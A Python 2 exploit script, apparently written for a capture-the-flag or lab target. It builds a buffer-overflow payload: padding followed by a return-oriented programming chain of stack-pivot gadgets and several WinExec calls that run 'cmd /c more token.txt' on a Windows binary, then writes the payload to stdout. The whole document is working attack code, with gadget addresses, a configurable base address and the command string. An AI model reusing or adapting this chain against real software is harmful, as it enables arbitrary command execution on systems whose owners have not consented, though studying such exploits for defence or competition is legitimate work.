import sys
import struct

B = 0x6c4d0000
B = 0

rop = 'A'*(820-4)

esp_v10 =0x000189a2    # add esp, 0x20; ret
esp_v9 = 0x00130bf1    # add esp, 0x2c; ret
esp_v3 = 0x0055cfb9    # add esp, 0x54; ret
esp_v6 = 0x00323ac6    # add esp, 0x68; ret
esp_v4 = 0x0056c4d0    # add esp, 0x7c; ret
esp_v7 = 0x0057fdb0    # add esp, 0x7c; ret
esp_v8 = 0x00a0cc74    # add esp, 0x94; pop edi; pop esi; pop ebp; ret ; 

# splitter
rop += struct.pack("I", 0x000019bd+B)
rop += struct.pack("I", 0x00001520+B)
rop += struct.pack("I", 0x005c107b+B)
rop += struct.pack("I", esp_v3+B)
rop += struct.pack("I", esp_v6+B)
rop += struct.pack("I", esp_v4+B)
rop += struct.pack("I", 0x00580c63+B)
rop += struct.pack("I", esp_v10+B)
rop += struct.pack("I", esp_v9+B)
rop += struct.pack("I", 0xAAAAAAAA)
rop += struct.pack("I", 0xBBBBBBBB)
rop += struct.pack("I", 0xCCCCCCCC)
rop += struct.pack("I", 0xDDDDDDDD)
rop += struct.pack("I", 0x00aec9d1+B)
rop += struct.pack("I", esp_v7+B)
rop += struct.pack("I", esp_v8+B)

# (0) payload_10
rop += struct.pack("I", 0x0000ffc9+B)
rop += struct.pack("I", 0xac)
rop += struct.pack("I", 0x004e31b1+B)
rop += struct.pack("I", 0x002AEFE4+B)
# sleep_test

# (4) payload_9 add_2C
rop += struct.pack("I", 0x0000e839+B)   # 0x6000e839 -> pop eax; ret ; 
rop += struct.pack("I", 0x9c)
rop += struct.pack("I", 0x0053a216+B)   # 0x6053a216 -> add eax, esp; ret ; 
rop += struct.pack("I", 0x0009a56f+B)   # 0x6009a56f -> xchg eax, edi; ret ; 
rop += struct.pack("I", 0x002B1E80+B)   # push 1; push edi; call ds:WinExec

# (9) payload_3 add_54
rop += struct.pack("I", 0x000013aa+B)   # 0x600013aa -> pop ecx; ret ; 
rop += struct.pack("I", 0x88)
rop += struct.pack("I", 0x003cdd61+B)   # 0x603cdd61 -> add ecx, esp; ret ; 
rop += struct.pack("I", 0x00768551+B)   # 0x60768551 -> xchg eax, ecx; mov edi, edi; ret ; 
rop += struct.pack("I", 0x0007b7ce+B)   # 0x6007b7ce -> xchg eax, edi; ret ; 
rop += struct.pack("I", 0x0028A40C+B)   # 0x6028A40C -> push 1; push edi; call ds:WinExec

# (15) payload_6 add_68
rop += struct.pack("I", 0x0000d8a7+B)   # 0x6000d8a7 -> pop eax; ret ; 
rop += struct.pack("I", 0x70)
rop += struct.pack("I", 0x002033dc+B)   # 0x602033dc -> add eax, esp; dec ecx; ret ; 
rop += struct.pack("I", 0x0003536b+B)   # 0x6003536b -> xchg eax, edi; ret ; 
rop += struct.pack("I", 0x0029A193+B)   # push 1; push edi; call ds:WinExec

# (20) payload_4 add_78 -> 7c
rop += struct.pack("I", 0xAABBCCDD)     # -
rop += struct.pack("I", 0x003baa62+B)   # 0x603baa62 -> mov eax, esp; dec ecx; ret ; 
rop += struct.pack("I", 0x0007baf0+B)   # 0x6007baf0 -> xchg eax, edi; ret ; 
rop += struct.pack("I", 0x000012f2+B)   # 0x600012f2 -> pop esi; ret ; 
rop += struct.pack("I", 0x60)           #
rop += struct.pack("I", 0x00526ebd+B)   # 0x60526ebd -> add edi, esi; ret ; 
rop += struct.pack("I", 0x00291221+B)   # 0x60291221 push 1; push edi; call ds:WinExec

# (27) payload_7 add_70 -> 7c
rop += struct.pack("III", 0xaa,0xbb,0xcc)        # -
rop += struct.pack("I", 0x0000e817+B)   # 0x6000e817 -> pop eax; ret ;
rop += struct.pack("I", 0x34)           #
rop += struct.pack("I", 0x004f624c+B)   # 0x604f624c -> mov edx, esp; ret ;
rop += struct.pack("I", 0x00234d9a+B)   # 0x60234d9a -> add eax, edx; ret ;
rop += struct.pack("I", 0x00096d86+B)   # 0x60096d86 -> xchg eax, edi; ret ;
rop += struct.pack("I", 0x002A4A9E+B)   # 0x602A4A9E  push 1; push edi; call ds:WinExec

# (36) payload_8 add_90 -> 94+c
rop += struct.pack("IIII", 0xaa,0xbb,0x18-4,0xcc)  # _, pop edi; pop esi; pop ebp; ret ; 
rop += struct.pack("I", 0x099fb0b+B)    # mov eax, esp ; retn 0x0000 ;
rop += struct.pack("I", 0x000106b9+B)   # add eax, esi ; pop esi ; pop ebp ; ret  ;
rop += struct.pack("I", 0xAABBCCDD)     # -
rop += struct.pack("I", 0xAABBCCDD)     # -
rop += struct.pack("I", 0x000261fc+B)   # xchg eax, edi; ret ; 
rop += struct.pack("I", 0x002A4C42+B)   # push 1; push edi; call ds:WinExec

cmd = "more token.txt"
#cmd = "echo PWNED"
rop += "cmd /c \"%s\"\x00" % cmd
rop = rop.ljust(len(rop)+(8-len(rop)%8))

rop += struct.pack("II", 1, 1)         # loadlib
offs = [0, 4, 8, 12, 16, 20, 24, 28, 32, 52, 56, 60, 64, 72, 76, 80, 88, 92, 96, 100, 108, 112, 116, 120, 124, 132, 136, 140, 148, 152, 156, 164, 168, 184, 192, 196, 200, 204, 224, 228, 240, 244] #, 264]
for off in offs:
    rop += struct.pack("II", 2, (820-4)+off)

# [finish]
rop += struct.pack("II", 0, 0)
rop += struct.pack("II", 0, 0)

sys.stdout.write(rop)